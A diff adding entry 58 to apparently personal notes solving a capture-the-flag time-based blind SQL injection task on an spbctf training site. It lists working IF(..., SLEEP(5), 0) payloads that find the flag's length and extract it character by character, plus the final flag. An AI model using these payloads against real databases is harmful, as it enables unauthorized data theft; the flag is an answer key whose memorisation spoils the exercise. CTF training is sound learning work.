@@ -1249,3 +1249,74 @@ https://textcompare.io/string-to-int-converter
 ->
 
 spbctf{7a9cc937ed8c991f5fc5a87931810468}
+
+58) http://kslweb1.spb.ctf.su/sqli/time1/
+
+https://www.asciitable.com/
+
+IF(1=1, SLEEP(5), 0)
+IF(1=2, SLEEP(5), 0)
+IF(LENGTH('qwe')=3, SLEEP(5), 0)
+IF((SELECT count(*) FROM flag)=1, SLEEP(5), 0)
+IF(LENGTH((SELECT flag FROM flag))>=1, SLEEP(5), 0)
+IF(LENGTH((SELECT flag FROM flag))>30, SLEEP(5), 0)
+IF(LENGTH((SELECT flag FROM flag))>40, SLEEP(5), 0)
+IF(LENGTH((SELECT flag FROM flag))=31, SLEEP(5), 0)
+IF(LENGTH((SELECT flag FROM flag))=32, SLEEP(5), 0)
+IF(SUBSTR((SELECT flag FROM flag),1,1)='a', SLEEP(5), 0)
+IF(SUBSTR((SELECT flag FROM flag),1,1)='b', SLEEP(5), 0)
+IF(SUBSTR((SELECT flag FROM flag),1,1)='c', SLEEP(5), 0)
+
+---
+
+IF(ASCII(SUBSTR((SELECT flag FROM flag),13,1))>33, SLEEP(5), 0)
+
+CHAR(97) = a
+CHAR(103) = g
+ASCII('b') = 98
+IF(CHAR(103)='g', SLEEP(5), 0)
+IF(SUBSTR((SELECT flag FROM flag),8,1)=CHAR(103), SLEEP(5), 0)
+IF(ASCII(SUBSTR((SELECT flag FROM flag),8,1))>=103, SLEEP(5), 0)
+
+ASCII 33 -> 126
+
+---
+
+IF(SUBSTR((SELECT flag FROM flag),1,1)='s', SLEEP(5), 0)
+IF(SUBSTR((SELECT flag FROM flag),2,1)='p', SLEEP(5), 0)
+IF(SUBSTR((SELECT flag FROM flag),3,1)='b', SLEEP(5), 0)
+IF(SUBSTR((SELECT flag FROM flag),4,1)='c', SLEEP(5), 0)
+IF(SUBSTR((SELECT flag FROM flag),5,1)='t', SLEEP(5), 0)
+IF(SUBSTR((SELECT flag FROM flag),6,1)='f', SLEEP(5), 0)
+IF(SUBSTR((SELECT flag FROM flag),7,1)='{', SLEEP(5), 0)
+IF(SUBSTR((SELECT flag FROM flag),8,1)='g', SLEEP(5), 0)
+IF(ASCII(SUBSTR((SELECT flag FROM flag),9,1))=48, SLEEP(5), 0)
+IF(SUBSTR((SELECT flag FROM flag),10,1)='0', SLEEP(5), 0)
+IF(SUBSTR((SELECT flag FROM flag),11,1)='d', SLEEP(5), 0)
+IF(SUBSTR((SELECT flag FROM flag),12,1)='_', SLEEP(5), 0)
+IF(ASCII(SUBSTR((SELECT flag FROM flag),13,1))=106, SLEEP(5), 0)
+IF(ASCII(SUBSTR((SELECT flag FROM flag),14,1))=48, SLEEP(5), 0)
+IF(ASCII(SUBSTR((SELECT flag FROM flag),15,1))=66, SLEEP(5), 0)
+IF(ASCII(SUBSTR((SELECT flag FROM flag),16,1))=95, SLEEP(5), 0)
+IF(ASCII(SUBSTR((SELECT flag FROM flag),17,1))=82, SLEEP(5), 0)
+IF(ASCII(SUBSTR((SELECT flag FROM flag),18,1))=101, SLEEP(5), 0)
+IF(ASCII(SUBSTR((SELECT flag FROM flag),19,1))=115, SLEEP(5), 0)
+IF(ASCII(SUBSTR((SELECT flag FROM flag),20,1))=49, SLEEP(5), 0)
+IF(ASCII(SUBSTR((SELECT flag FROM flag),21,1))=100, SLEEP(5), 0)
+IF(ASCII(SUBSTR((SELECT flag FROM flag),22,1))=51, SLEEP(5), 0)
+IF(ASCII(SUBSTR((SELECT flag FROM flag),23,1))=110, SLEEP(5), 0)
+IF(ASCII(SUBSTR((SELECT flag FROM flag),24,1))=116, SLEEP(5), 0)
+IF(ASCII(SUBSTR((SELECT flag FROM flag),25,1))=83, SLEEP(5), 0)
+IF(ASCII(SUBSTR((SELECT flag FROM flag),26,1))=49, SLEEP(5), 0)
+IF(ASCII(SUBSTR((SELECT flag FROM flag),27,1))=51, SLEEP(5), 0)
+IF(ASCII(SUBSTR((SELECT flag FROM flag),28,1))=51, SLEEP(5), 0)
+IF(ASCII(SUBSTR((SELECT flag FROM flag),29,1))=112, SLEEP(5), 0)
+IF(ASCII(SUBSTR((SELECT flag FROM flag),30,1))=51, SLEEP(5), 0)
+IF(ASCII(SUBSTR((SELECT flag FROM flag),31,1))=114, SLEEP(5), 0)
+IF(ASCII(SUBSTR((SELECT flag FROM flag),32,1))=125, SLEEP(5), 0)
+
+IF(ASCII(SUBSTR((SELECT flag FROM flag),9,1))>100, SLEEP(5), 0)
+
+---
+
+spbctf{g00d_j0B_Res1d3ntS133p3r}
